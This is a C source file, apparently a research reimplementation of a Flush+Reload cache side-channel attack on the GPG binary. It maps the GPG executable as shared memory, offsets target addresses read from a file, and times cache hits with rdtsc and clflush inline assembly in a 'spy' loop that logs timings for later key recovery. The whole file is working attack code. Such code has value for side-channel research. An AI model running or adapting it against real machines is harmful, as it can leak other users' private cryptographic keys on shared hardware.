#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#include "args.h"

// Roughly 4 MB. Always ensure that the executable is smaller than this
#define GPG_MAX_SIZE_BYTES 4194304

// See paper for the threshold of probe()
#define PROBE_THRESHOLD 110ul

// Maximum number of addresses to probe
#define MAX_NUM_OF_ADDRS 10u

#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++)\
                                                 ;

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time < PROBE_THRESHOLD;
}

unsigned long probe_timing(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

void spy(char **addrs, size_t num_addrs, FILE *out_file) {
    for (int slot = 0; slot < 10000; slot++) {
        for (int addr = 0; addr < (int) num_addrs; addr++) {
            char *ptr = addrs[addr];
            unsigned long result = probe_timing(ptr);
            fprintf(out_file, "%d %d %lu\n", slot, addr, result);
        }
        busy_wait(2500);
    }
}

void offset_addresses(void *gpg_base, char **addrs, size_t num_addrs) {
    for (size_t i = 0; i < num_addrs; i++) {
        // Here be dragons :O
        unsigned long ptr_offset = (unsigned long)gpg_base;
        char *adjusted_ptr = addrs[i] + ptr_offset;

        addrs[i] = adjusted_ptr;
    }
}

int main(int argc, char *argv[]) {
    struct args_st arguments;
    if (!read_args(&arguments, argc, argv)) {
        return 1;
    }

    // memory map so we can force OS to share this memory page with GPG process
    size_t map_len = GPG_MAX_SIZE_BYTES;
    void *gpg_base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
            arguments.gpg_fd, 0);
    if (gpg_base == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("GPG binary mmapped to %p\n", gpg_base);

    // NOTE: this is an array of pointers. The paper uses `char *` for this, but
    // I'm not sure yet if we can get away with using `void *` instead, which I
    // think is a lot easier to understand.
    char *addrs[MAX_NUM_OF_ADDRS];
    size_t num_addrs = read_addrs(arguments.addr_file, addrs, MAX_NUM_OF_ADDRS);
    if (num_addrs == 0) {
        fprintf(stderr, "Did not read any addresses from file\n");
        return 0;
    }

    printf("Probing %lu addresses:\n", num_addrs);
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    offset_addresses(gpg_base, addrs, num_addrs);
    printf("Here are the offset addresses (respectively):\n");
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    // ATTAAAAACK!
    printf("Started spying\n");
    spy(addrs, num_addrs, arguments.out_file);
    printf("Finished spying\n");

    // Probably never reached because we'll likely just ^C the program. Maybe
    // implement a SIGTERM / SIGINT handler?
    munmap(gpg_base, map_len);
    cleanup_args(&arguments);
    return 0;
}

